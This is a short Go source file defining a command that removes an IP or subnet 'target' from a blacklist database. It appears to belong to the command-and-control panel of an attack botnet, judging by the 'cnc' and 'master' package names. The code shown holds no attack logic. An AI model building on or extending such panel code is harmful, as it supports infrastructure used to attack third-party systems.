package commands

import (
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"
)

var commandBlacklistRemove = &command.Command{
	Aliases:     []string{"remove", "delete", "drop"},
	Description: "Removes a blacklisted target from the database.",
	Arguments: []*command.Argument{
		command.NewArgument("target", nil, command.ArgumentString, true),
	},
	Executor: func(session *sessions.Session, ctx *command.Context) error {
		targetStr, err := ctx.String("target")
		if err != nil {
			return err
		}

		var target = strings.Split(targetStr, "/")
		var netmask = 32

		// Attempt to parse subnet mask
		if len(target) == 2 {
			if netmask, err = strconv.Atoi(target[1]); err != nil {
				return err
			}

			if netmask < 0 || netmask > 32 {
				return errors.New("invalid netmask")
			}
		}

		// Validates IP address
		var ip net.IP
		if ip = net.ParseIP(target[0]); ip == nil {
			return errors.New("invalid ip")
		}

		// Checks if target is not blacklisted.
		if !database.Blacklist.Is(binary.BigEndian.Uint32(ip.To4()), uint8(netmask)) {
			return session.Notification("Target is not blacklisted.")
		}

		// Select target from blacklist
		bTarget, err := database.Blacklist.Select(target[0], netmask)
		if err != nil {
			return err
		}

		// Removes target from database.
		if err = bTarget.Drop(); err != nil {
			return err
		}

		return session.Notification("%s/%d is no longer blacklisted.", target[0], netmask)
	},
}
